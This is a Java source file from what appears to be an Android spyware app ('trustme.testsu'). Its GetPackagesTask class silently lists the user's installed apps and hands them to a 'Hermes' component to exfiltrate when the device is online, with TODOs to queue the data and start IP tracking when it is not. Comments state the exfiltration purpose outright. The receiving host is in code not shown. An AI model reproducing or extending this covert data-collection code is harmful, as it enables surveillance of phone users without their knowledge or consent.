package com.trustme.testsu;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import com.trustme.testsu.utils.Constants;

import android.content.pm.PackageInfo;
import android.os.AsyncTask;
import android.util.Log;

/**
 * 
 * Background Task that will fetch the installed packages on the device.
 * It will try to exfiltrate them if there is Internet or 
 * store them in the DB and start the IP checker
 * @author sdemetr2
 *
 */
public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
	Hermes hermes = new Hermes();
	WiFiTracker wifiTracker = new WiFiTracker();
	
	protected GetPackagesTask() { }
	
	@Override
	protected Void doInBackground(Void... unused){
		try {
			// pass time so the built-in dialer app can make the call
			Thread.sleep(50);
		}
		catch (InterruptedException localInterruptedException)
		{
			Log.d("GetPackagesTask", "GetPackagesTask received an InterruptedException");
		}
		
		return null;
	}
	
	@Override
	protected void onPostExecute(Void justEyeCandy){
		super.onPostExecute(justEyeCandy);
		
		ArrayList<PInfo> packagesList = getPackages();
		HashMap<String, String> map = new HashMap<String, String>();
		
		for (PInfo pack : packagesList){
			map.put(pack.pname, pack.appname);
		}
		
		//exfiltrate
		if (wifiTracker.read_arp()){
			//TODO: Store the Data into the DB
			hermes.exfiltrate(map, Constants.PACKAGES_TRANSACTION);
			//TODO: mark the data in the DB as sent
		}
		else{
			//no internet
			//TODO: start the IP tracking service
			//store the data into DB
			
		}
	}
	
	/**
	 * It just prints the fetched packages info
	 * @return an ArrayList with the installed Applications as PInfo objects
	 */
	private ArrayList<PInfo> getPackages() {
		// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker 
	    ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
	    final int max = apps.size();
//	    for (int i=0; i<max; i++) {
//	        apps.get(i).prettyPrint();
//	    }
	    return apps;
	}
	
	/**
	 * 
	 * @param getSysPackages true if you want to fetch System packages as well, false otherwise
	 * @return an ArrayList with the installed Applications as PInfo objects
	 */
	private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
	    ArrayList<PInfo> res = new ArrayList<PInfo>();        
	    List<PackageInfo> packs = MyApplication.getAppContext().getPackageManager().getInstalledPackages(0);
	    for(int i=0; i<packs.size(); i++) {
	        PackageInfo p = packs.get(i);
	        if ((!getSysPackages) && (p.versionName == null)) {
	            continue ;
	        }
	        PInfo newInfo = new PInfo();
	        newInfo.appname = p.applicationInfo.loadLabel(MyApplication.getAppContext().getPackageManager()).toString();
	        newInfo.pname = p.packageName;
	        newInfo.versionName = p.versionName;
	        newInfo.versionCode = p.versionCode;
	        newInfo.icon = p.applicationInfo.loadIcon(MyApplication.getAppContext().getPackageManager());
	        res.add(newInfo);
	    }
	    return res; 
	}
	
}
